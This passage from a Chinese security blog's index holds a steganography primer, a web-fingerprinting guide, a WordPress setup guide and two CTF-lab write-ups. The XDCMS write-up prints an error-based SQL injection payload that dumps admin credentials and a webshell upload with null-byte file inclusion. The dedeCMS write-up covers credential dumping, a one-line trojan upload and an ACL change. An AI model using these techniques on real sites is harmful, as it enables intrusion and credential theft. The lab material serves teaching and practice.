欢乐赛部分WriteUp","uri":"/2021-01-31-2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B%E9%83%A8%E5%88%86writeup/"},{"categories":null,"content":"\r0x00 前言\rCTF中隐写术是一个非常有趣的部分，通常属于MISC的范围，有些题目需要和密码学等知识的结合，一直想整理出文字。套路一般固定，难度较低，但同时也极易形成思维定式，一旦遇上新颖的题型，没有足够的知识量和脑洞，可能就要吃瘪了。 评价隐写术的标准核心标准：隐蔽程度隐蔽程度越高，直接导致检测有效信息越困难 其他标准：隐写算法的好坏、隐写手段的复杂度、提取信息的难易度 在CTF中，隐写术的载体对象通常有文本、图像、音频、视频、压缩包等等，在一些情况下也不单一，下文也主要介绍上述种类。 各类文件的文件头标志 0x01 文本隐写\rDoc文件的本质是一种zip压缩文件，docx中的x指的是xml。文件头是50 4B。 下面介绍几种常见的DOC隐藏方式。 白色背景下写白字，无法被肉眼识别出有隐藏的文字。 通过文字的偏移（行移、字移）和颜色等来传递信息，比如上偏移代表0，下偏移代表1，传达二进制信息。 利用空格、换行、回车、标点（句号和逗号或者中英文符号）等。 利用不同字体、简体繁体，调整间距拼凑（比如：‘仁’和‘m’）。 同义词替换、句法变换（比如：把字句和被字句）。 隐藏在xml等文件中，修改后缀为zip压缩文件，解压后搜索相关信息。 Word隐藏图片，插入的图片方式分为嵌入式和非嵌入式。嵌入式随着文本的位置产生移动，即有回车后，图片下移。非嵌入图片保持原位置不动。 嵌入式：单击“文件”标签，选择“选项”选项打开“Word选项”对话框。在对话框左侧的列表中选择“高 级”选项，在右侧的“显示文档内容”栏中勾选“显示图片框”复选框，单击“确定”按钮关闭对话框后，文档中的嵌入式图片将被隐藏，将只显示图片框的框线。 非嵌入式：在“显示文档内容”栏中取消对“在屏幕上显示图形和文字”复选框的勾选。单击“确定”按钮关闭对话框后，文档中的非嵌入式图片将被隐藏。 Word中选中要隐藏的字段，右击选择字体选项，在效果一栏中有隐藏选项，选中后即可隐藏。默认情况下隐藏文字是不会被打印出来的。如果想知道是否有隐藏文本，可在文件选项中单击“文件”-》选项-》显示，选择“隐藏文字”复选框，即可查看。在保存文件后选择文件-》检查-》检查文件，查看是否有隐藏文字。 PDF文件则可以利用PDF文件头添加额外信息，这个区域的信息会被Adobe Acrobat Reader阅读器忽略。利用工具wbStego4open会把插入数据中的每一个ASCII码转换为二进制形式，然后把每一个二进制数字再替换为十六进制的20或者09，20代表0，09代表1，嵌入到PDF文件中。 0x02 图片隐写\r几乎8成的隐写题目都脱不开图片，而常见的图片格式有PNG、JPG/JPEG、BMP、GIF，下面分别介绍它们的结构。 PNG的文件结构 详细信息 PNG无损压缩的位图格式，文件头89 50 4E 47 0D 0A 1A 0A，数据块（chunk）基本的构成：文件头数据块（IHDR）、调色板数据块（PLTE）、图像数据块（IDAT）、图像结束数据（IEND）。 我们重点关注IHDR。它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。 文件头数据块由13字节组成，它的格式如下表所示。 JPEG/JPG的文件结构 JPEG/JPG为有损压缩，文件头为FF D8 FF。 ","date":"2021-01-29","objectID":"/2021-01-29-ctf%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/:0:0","tags":null,"title":"CTF隐写术入门总结","uri":"/2021-01-29-ctf%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/"},{"categories":["安全技术"],"content":"\r","date":"2021-01-21","objectID":"/2021-01-21-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E4%BD%A0%E6%98%AF%E4%BC%9A%E5%91%98%E5%90%97/:0:0","tags":["Web安全","渗透测试"],"title":"【i春秋】渗透测试入门 —— 你是会员吗？","uri":"/2021-01-21-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E4%BD%A0%E6%98%AF%E4%BC%9A%E5%91%98%E5%90%97/"},{"categories":["安全技术"],"content":"0x00 前言 题目链接：https://www.ichunqiu.com/battalion?t=2\u0026r=54399 实验环境 操作机：Windows XP 实验工具： \u003ccode\u003eBURP 中国菜刀 实验任务： 本次实验要求获取www.test.ichunqiu网站的FLAG信息。 实验试题: 第1题：获取ww.test.ichunqiu后台登录密码。 第2题：获取目标网站目录中的flag文件信息。 ","date":"2021-01-21","objectID":"/2021-01-21-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E4%BD%A0%E6%98%AF%E4%BC%9A%E5%91%98%E5%90%97/:1:0","tags":["Web安全","渗透测试"],"title":"【i春秋】渗透测试入门 —— 你是会员吗？","uri":"/2021-01-21-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E4%BD%A0%E6%98%AF%E4%BC%9A%E5%91%98%E5%90%97/"},{"categories":["安全技术"],"content":"0x01 管理员密码 首先打开网页 能够观察到网站是XDCMS，寻找相关漏洞，根据题目中的“会员”、“SQLMAP”等关键词，查找发现在XDCMS企业管理系统的注册功能处存在SQL注入漏洞，index.php的register_save函数处。\rpublic function register_save(){ $username=safe_html($_POST['username']);//获取UserName，这里用safe_html函数进行过滤 $password=$_POST['password']; $password2=$_POST['password2']; $fields=$_POST['fields']; if(empty($username)||empty($password2)||empty($password)){ showmsg(C('material_not_complete'),'-1'); } if(!strlength($username,5)){ showmsg(C('username').C('str_len_error').'5','-1'); } if(!strlength($password,5)){ showmsg(C('password').C('str_len_error').'5','-1'); } if($password!=$password2){ showmsg(C('password_different'),'-1'); } $password=md5(md5($password)); $user_num=$this-\u003emysql-\u003enum_rows(\"select * from \".DB_PRE.\"member where `username`='$username'\");//判断会员是否存在，这里的UserName可被绕过过滤，导致注入，这是第一处SQL注入 if($user_num\u003e0){ showmsg(C('member_exist'),'-1'); } $ip=safe_replace(safe_html(getip())); $this-\u003emysql-\u003edb_insert('member',\"`username`='\".$username.\"',`password`='\".$password.\"',`creat_time`='\".datetime().\"',`last_ip`='\".$ip.\"',`is_lock`='0',`logins`='0',`groupid`='1'\");//插入主要字段——用户名、密码，这里的UserName同样造成注入，第二处sql注入 $last_id=$this-\u003emysql-\u003einsert_id(); //插入附属字段 $field_sql=''; foreach($fields as $k=\u003e$v){ $f_value=$v; if(is_array($v)){ $f_value=implode(',',$v); } $field_sql.=\",`{$k}`='{$f_value}'\";//这里没有过滤，直接进入了下面的update sql语句，导致第三处sql注入 } $field_sql=substr($field_sql,1); $field_sql=\"update \".DB_PRE.\"member set {$field_sql} where userid={$last_id}\"; $query=$this-\u003emysql-\u003equery($field_sql); showmsg(C('register_success'),'index.php?m=member\u0026f=register'); } 开始设置Burp的代理。 注册新用户 在登录页面，UserName后插入下方EXP\r' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0x23,password) FROM c_admin LIMIT 0,1))a FROM information_schema.tables GROUP by a)b#' Forward后，页面蹦出用户名xdcms121和一串MD5值，解密后得到xdcms212 ","date":"2021-01-21","objectID":"/2021-01-21-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E4%BD%A0%E6%98%AF%E4%BC%9A%E5%91%98%E5%90%97/:2:0","tags":["Web安全","渗透测试"],"title":"【i春秋】渗透测试入门 —— 你是会员吗？","uri":"/2021-01-21-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E4%BD%A0%E6%98%AF%E4%BC%9A%E5%91%98%E5%90%97/"},{"categories":["安全技术"],"content":"0x02 flag文件信息 在登录页面无法以管理员身份登录，猜测有管理员页面，开御剑扫一下后台目录。“啪”的一下，很快啊，发现了几个带admin的路径。 成功进入后台。 构建图片马Copy Sunset.jpg/b+ muma.txt/aresult.jpg /y 找到文件上传点，但图片无法正常上传，借鉴其他师傅的经验，在图片栏输入图片的绝对路径。 上传后打开Burp，Proxy -\u003e History 中点击相应记录，并在 Response -\u003e Raw 中看到图片马的地址为/uploadfile/image/20210121/202101210957560.jpg。 利用 URL 查询字符串的 m 参数指向图片马的路径，最终触发文件包含漏洞，关键语句如下： include MOD_PATH.$m.\"/\".$c.\".php\"; //调用类\r因此使用菜刀 添加SHELL 时，赋值给 m 的图片马路径需要先从 MOD_PATH 返回根目录，拟在前面添加 ../../，猜测向上返回两级目录后可到达根目录，若猜测正确即能指向图片马的路径。http://www.test.ichunqiu/index.php?m=../../uploadfile/image/20210121/202101210957560.jpg，选择php。 结果弹出报错信息，这里是因为参数 m 被引用到源码后，后面还连了一段字符串，该字符串默认情况下是 /index.php，在参数 m 末尾加入空字符 %00，对源码中的 include 语句进行截断。 成功连接，打开flag文件，成功得到key{7h7hii9a} ","date":"2021-01-21","objectID":"/2021-01-21-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E4%BD%A0%E6%98%AF%E4%BC%9A%E5%91%98%E5%90%97/:3:0","tags":["Web安全","渗透测试"],"title":"【i春秋】渗透测试入门 —— 你是会员吗？","uri":"/2021-01-21-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E4%BD%A0%E6%98%AF%E4%BC%9A%E5%91%98%E5%90%97/"},{"categories":["学习"],"content":"\r","date":"2021-01-16","objectID":"/2021-01-16-%E8%A7%82%E6%98%9Ffinger-p%E6%8C%87%E7%BA%B9%E5%B9%B3%E5%8F%B0%E6%8C%87%E7%BA%B9%E7%BC%96%E5%86%99/:0:0","tags":["Web安全"],"title":"观星Finger-P指纹平台指纹编写","uri":"/2021-01-16-%E8%A7%82%E6%98%9Ffinger-p%E6%8C%87%E7%BA%B9%E5%B9%B3%E5%8F%B0%E6%8C%87%E7%BA%B9%E7%BC%96%E5%86%99/"},{"categories":["学习"],"content":"0x00 前言 最近，数字观星和谷安联合主办了一个活动，奖品比较丰厚，还有甜品能帮上应届求职，不免有些心动，但原来从没有接触过指纹编写，就在文档和大佬指点下开始尝试了，如今也刚好达到了40条，顺便记录下心路历程。 数字观星Finger-P指纹平台 ","date":"2021-01-16","objectID":"/2021-01-16-%E8%A7%82%E6%98%9Ffinger-p%E6%8C%87%E7%BA%B9%E5%B9%B3%E5%8F%B0%E6%8C%87%E7%BA%B9%E7%BC%96%E5%86%99/:1:0","tags":["Web安全"],"title":"观星Finger-P指纹平台指纹编写","uri":"/2021-01-16-%E8%A7%82%E6%98%9Ffinger-p%E6%8C%87%E7%BA%B9%E5%B9%B3%E5%8F%B0%E6%8C%87%E7%BA%B9%E7%BC%96%E5%86%99/"},{"categories":["学习"],"content":"0x01 啥是指纹？ 数字观星Finger-P指纹平台是基于Wappalyzer针对于web指纹识别的平台，在此文中指纹特指web指纹。Web指纹是web服务组件在开发时留下的对其类型及版本进行标识的特殊信息，包括web服务器指纹、web运用指纹以及前端框架指纹等。在web安全测试过程中，收集web指纹信息也是一个比较重要的步骤；在安全运营过程中，通过指纹识别识别资产的web信息，这样能更加了解整个资产存在哪些方面的威胁，然后对症检测修补，提升安全工作的效率。网络上开源的web指纹识别程序很多，如Wappalyzer，whatweb, wpscan, joomscan等等，也有云悉等在线指纹平台。 这里简单展示火狐插件Wappalyzer对本网站的指纹信息检测。 观星Finger-P指纹平台接收指纹（网站默认首页能识别）的范围包括CMS应用指纹、WEB中间件指纹、首页能识别的应用指纹、国内外的其它web应用指纹等。 指纹应用层级 **应用层：**主要是各种web应用系统以及前端js框架等，比如dedecms、xxx应用系统、邮件系统等； **支撑层：**主要是语言、后端框架等，比如java、php、struts、spring等； **服务层：**主要是服务和应用，以及协议，包含openssh、apahce、tomcat、ssl、ntp、icmp等； **系统层：**主要指操作系统，包含Linux、unix、centos、Ubuntu、Windows等； **硬件层：**主要是硬件设备为主，包含路由器、交换机、防火墙、VPN、waf（现在不区分软waf）、以及物联网等设备； 基于Wappalyzer的指纹识别分类 指纹识别的几种方式 A、网页中发现关键字（比如CopyRight、电话号、应用名称等。） B、特定文件的MD5（主要是静态文件、不一定要是MD5） C、指定URL的关键字 D、指定URL的TAG模式 ","date":"2021-01-16","objectID":"/2021-01-16-%E8%A7%82%E6%98%9Ffinger-p%E6%8C%87%E7%BA%B9%E5%B9%B3%E5%8F%B0%E6%8C%87%E7%BA%B9%E7%BC%96%E5%86%99/:2:0","tags":["Web安全"],"title":"观星Finger-P指纹平台指纹编写","uri":"/2021-01-16-%E8%A7%82%E6%98%9Ffinger-p%E6%8C%87%E7%BA%B9%E5%B9%B3%E5%8F%B0%E6%8C%87%E7%BA%B9%E7%BC%96%E5%86%99/"},{"categories":["学习"],"content":"0x02 Wappalyzer的安装与使用 Wappalyzer是基于正则表达式来识别web应用，它的功能是识别单个url的指纹，其原理就是给指定URI发送HTTP请求，获取响应头与响应体并按指纹规则进行匹配。它也是一款浏览器插件，能识别出网站采用了那种web技术，能够检测出CMS和电子商务系统、留言板、javascript框架，主机面板，分析统计工具和其它的一些web系统。 （1）Wappalyzer的安装与使用需要基于Node.js，需要注意的是官方的帮助文档中提及Nodejs V10/12 已经不支持采用TLS 1.0以前协议的HTTPS站点，建议使用V8版本来进行测试。 （2）通过Node.js安装wappalyzer \u003ccode\u003enpm i wappalyzer\u003c/code\u003e\r（3）使用wappalyzer指纹识别 cmd打开命令行，使用wappalyzer 目的网站命令来进行指纹识别。 或者通过调用wappalyzer模块识别指纹信息node ./node_modules/wappalyzer/cli.js 目的网站 Wappalyze执行文件在C:\\Users\\xx\\AppData\\Roaming\\npm\\，Wappalyzer的包目录在C:\\Users\\xx\\AppData\\Roaming\\npm\\node_modules\\wappalyzer，重点是apps.json(即为technologies.json），这个文件记录的是整个的指纹规则，json文件里面有两部分apps（technologies）与categories，写的指纹就是放在这里面进行识别网站的，categories是指纹的类型，这项可以不用管，只看apps（technologies）。 ","date":"2021-01-16","objectID":"/2021-01-16-%E8%A7%82%E6%98%9Ffinger-p%E6%8C%87%E7%BA%B9%E5%B9%B3%E5%8F%B0%E6%8C%87%E7%BA%B9%E7%BC%96%E5%86%99/:3:0","tags":["Web安全"],"title":"观星Finger-P指纹平台指纹编写","uri":"/2021-01-16-%E8%A7%82%E6%98%9Ffinger-p%E6%8C%87%E7%BA%B9%E5%B9%B3%E5%8F%B0%E6%8C%87%E7%BA%B9%E7%BC%96%E5%86%99/"},{"categories":["学习"],"content":"0x03 指纹规则 基于Wappalyzer的指纹规则说明 指纹编写样例 \"Struts\": {\r\"cats\": [ \"18\"],\r\"html\":\"(href|action|src).*?=.*?(action|do)\\\\;confidence:50\",\r\"url\": \"/.*\\\\.do$|/.*\\\\.action$\\\\;confidence:40\",\r\"html\": \"Struts Problem Report\",\r\"website\": \"http://struts.apache.org/\",\r\"_fingerprint_note\":\"Apache Struts是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。\",\r\"_fingerprint_test_url\":\"https://www.shuziguanxing.com/\"\r}\r应用名称struts组件 分类18（web框架） 匹配html中是否存在action,do后缀，定义可信值50 layer是指这个应用属于5层中的那一层，该应用属于数据支撑层 匹配URL中是否有do和action后缀，定义可信值40 匹配html中是否存在“Struts Problem Report”字符串 website为应用官网地址 _fingerprint_note是简单描述这个应用 _fingerprint_test_url为指纹识别测试的URL 默认不定义可信值则为100。总体可信值如果超过100，也只会返回100。 Wappalyzer测试的编写样例 { \"$schema\":\r\"../schema.json\", \"apps\":{ \"1C-Bitrix\":{ \"cats\":[ 1 ], \"headers\":{\r\"Set-Cookie\":\"BITRIX_\", \"X-Powered-CMS\":\"Bitrix Site Manager\" }, \"html\":\"(?:\u003clink[^\u003e]+components/bitrix(?:src|href)=\\\"/bitrix/(?:js|templates))\", \"icon\":\"1C-Bitrix.png\", \"implies\":\"PHP\", \"script\":\"1c-bitrix\", \"website\":\"http://www.1c-bitrix.ru\" }, }, \"categories\":{ \"1\":\r{ \"name\":\"CMS\", \"priority\":1 }, ...... }}\rapps 应用名1C-Bitrix 匹配Headers特征 匹配html 匹配icon 包含PHP的所有指纹信息 匹配Script website为应用官网地址 categories 编号 名称 优先级 上述样例中用到了一些正则表达式，这在指纹编写过程中可以提升指纹的质量，比如将年份2021换成\\d{4}。 ","date":"2021-01-16","objectID":"/2021-01-16-%E8%A7%82%E6%98%9Ffinger-p%E6%8C%87%E7%BA%B9%E5%B9%B3%E5%8F%B0%E6%8C%87%E7%BA%B9%E7%BC%96%E5%86%99/:4:0","tags":["Web安全"],"title":"观星Finger-P指纹平台指纹编写","uri":"/2021-01-16-%E8%A7%82%E6%98%9Ffinger-p%E6%8C%87%E7%BA%B9%E5%B9%B3%E5%8F%B0%E6%8C%87%E7%BA%B9%E7%BC%96%E5%86%99/"},{"categories":["学习"],"content":"0x04 实战编写 （1）寻找要写web指纹的产品 这里需要用到一些工具，Sodan、Fofa、ZoomEye，可以通过类似https://www.oschina.net/project或者https://www.cnvd.org.cn/flaw/typelist?typeId=29去批量获取产品名录；或者是批量获取web软件厂商名录再去空间测绘的站点批量收集厂商的产品名录；又或者直接范围较广的关键词在空间测绘引擎中搜索批量获取名单，诸如地名，应用类别名称等关键词。俗话说，万事开头难，这一步是整个指纹编写最难搞的一步。 （2）寻找线上样例与排重 可以直接到指纹库中查询进行大概率排重。也可以考虑在批量寻找产品的时候，在大方向上避开Finger-P指纹平台上已有的大块，这个需要对Finger-P指纹平台已有指纹的大块有所了解和自行分析。通过避开Finger-P指纹平台上已有的大块来简化排重这一个步骤。出现“此域名指纹不存在！”或者现有的指纹信息中没有对应产品。 （3）观察该web应用 按照我微不足道的经验来说，Web应用系列的产品中html是最容易看出来的，一般藏在\u003ctitle\u003e、\u003cp\u003e、\u003cdiv\u003e、\u003cmeta\u003e等标签中。 其次是cookie和script。 其他的按照指纹规则搜集。 （4）依据以上特征提交指纹到平台**** 平台提供两种方式：表单提交和批量提交，初学者建议采用表单提交，熟练后批量提交很爽快。 首先看一下表单的页面。 应用层级对应0x01的内容。\r识别方式默认是首页特征（即为HTML中的内容），对应指纹的识别方式。 指纹种类默认是Web Server（Web 服务），可根据需要多选或修改，一般默认就足够的。 批量提交的指纹撰写方式可具体参考下列文档。 小雪 | 宜学以致用写指纹 忌不积硅步绘资产 小雪 | 宜指纹学习以致用 忌只看少练基础功 Finger-P指纹平台活动技术指南 : Web指纹编写与批量编写思想 官方帮助文档 ","date":"2021-01-16","objectID":"/2021-01-16-%E8%A7%82%E6%98%9Ffinger-p%E6%8C%87%E7%BA%B9%E5%B9%B3%E5%8F%B0%E6%8C%87%E7%BA%B9%E7%BC%96%E5%86%99/:5:0","tags":["Web安全"],"title":"观星Finger-P指纹平台指纹编写","uri":"/2021-01-16-%E8%A7%82%E6%98%9Ffinger-p%E6%8C%87%E7%BA%B9%E5%B9%B3%E5%8F%B0%E6%8C%87%E7%BA%B9%E7%BC%96%E5%86%99/"},{"categories":["安全技术"],"content":"\r","date":"2021-01-07","objectID":"/2021-01-07-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/:0:0","tags":["Web安全","渗透测试"],"title":"【i春秋】渗透测试入门 —— 真的很简单","uri":"/2021-01-07-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/"},{"categories":["安全技术"],"content":"0x00 前言 题目链接：https://www.ichunqiu.com/battalion?t=2\u0026r=54399 实验环境 操作机：Windows XP 实验工具： net.exe dedeCMS 中国菜刀 实验任务： 本次实验要求获取www.test.ichunqiu网站的FLAG信息。 实验试题: 第1题：网站管理员密码是多少？ 第2题：网站后台目录名是什么？ 第3题：管理员桌面中flag文件信息是? ","date":"2021-01-07","objectID":"/2021-01-07-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/:1:0","tags":["Web安全","渗透测试"],"title":"【i春秋】渗透测试入门 —— 真的很简单","uri":"/2021-01-07-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/"},{"categories":["安全技术"],"content":"0x01 管理员密码 根据提示，访问url。 下载并打开dedecms.exe，输入目标url，一键爆账号密码，可以看到用户名和密码的20 位哈希值（织梦 CMS 的特性）成功出来了。 dedecms的20位md5加密算法是从32位md5中截取的20位，去掉前3位和最后1位，即可获得16位md5值，即可破解15位md5\r将密码的MD5加密值输入https://www.somd5.com/，可以很快的得出密码是only_system ","date":"2021-01-07","objectID":"/2021-01-07-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/:2:0","tags":["Web安全","渗透测试"],"title":"【i春秋】渗透测试入门 —— 真的很简单","uri":"/2021-01-07-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/"},{"categories":["安全技术"],"content":"0x02 后台目录名 采用御剑后台扫描工具进行目录扫描 对其可能的结果一一进行验证，没有任何发现，采取其他扫描工具后也一无所获。查找资料发现后台目录名具有较强的个性或随机性,要转换思路，看看dedeCMS 是否存在后台地址信息泄露的漏洞。 /data/admin/ver.txt查看版本信息，无果。 尝试可能存在的爆出后台路径的MySQL报错信息/data/mysql_error_trace.inc 或者 /data/mysqli_error_trace.inc，成功得到后台目录名lichunqiul 输入之前获取的用户名和密码，进入后台管理页面。 ","date":"2021-01-07","objectID":"/2021-01-07-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/:3:0","tags":["Web安全","渗透测试"],"title":"【i春秋】渗透测试入门 —— 真的很简单","uri":"/2021-01-07-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/"},{"categories":["安全技术"],"content":"0x03 flag文件 发现核心-\u003e附件管理-\u003e上传新文件可以传一句话木马。 在notepad++上写一句话木马。 在系统-\u003e系统设置-\u003e系统基本参数-\u003e附件设置进行修改并保存。 上传木马。 直接上中国菜刀WebShell,添加完成后，在新增的记录上点击右键，选择虚拟终端。在命令行中输入whoami，显示SYSTEM权限。 找到flag文件，type命令发现拒绝访问，用cacls命令查看访问控制列表，发现SYSTEM：N。 修改SYSTEM访问控制权限 CACLS命令使用方法\r再用cacls命令查看访问控制列表，发现SYSTEM：F。 再一次type文件得到key{il2o3l}。 ","date":"2021-01-07","objectID":"/2021-01-07-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/:4:0","tags":["Web安全","渗透测试"],"title":"【i春秋】渗透测试入门 —— 真的很简单","uri":"/2021-01-07-i%E6%98%A5%E7%A7%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/"},{"categories":["学习"],"content":"\r","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:0:0","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"1.购买云服务器 ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:1:0","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤1：注册腾讯云账号 登录https://cloud.tencent.com/，自行完成用户注册。 ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:1:1","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤2：完成学生资质认证 直接购买服务器有点儿小贵，学生党可以通过腾讯云的云+校园活动，完成学生认证，可获得3次以购买价优惠续费的资格。详情如下： https://cloud.tencent.com/act/campus?utm_source=qcloud\u0026utm_medium=head\u0026utm_campaign=campus ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:1:2","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤3：选购云服务器 在这里本人选购了云服务器 1核2G，每3个月27元，索性直接来了一年的份儿，也可依据自己的需要挑选，两个区，上海和北京，那个离你的常住地近就优先选择，如果差不多随意就好。 ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:1:3","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"2.手动搭建 LNMP 环境 LNMP 环境是指在 Linux 系统下，由 Nginx + MySQL/MariaDB + PHP 组成的网站服务器架构。首先在腾讯云云服务器（CVM）上手动搭建 LNMP 环境，以CentOS 7.5为例。 ","date":"2021-01-02","objectID":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/:2:0","tags":["网站搭建"],"title":"利用腾讯云快速搭建WordPress个人博客","uri":"/2021-01-02-%E5%AD%A6%E7%94%9F%E5%85%9A%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"categories":["学习"],"content":"步骤1：登录 Linux 实例 WebShell 为腾讯云推荐的登录方式。无论您的本地系统为 Windows，Linux 或者 Mac OS，只要实例购买了公网 IP，都可以通过 WebShell 登录。 WebShell 优点如下： 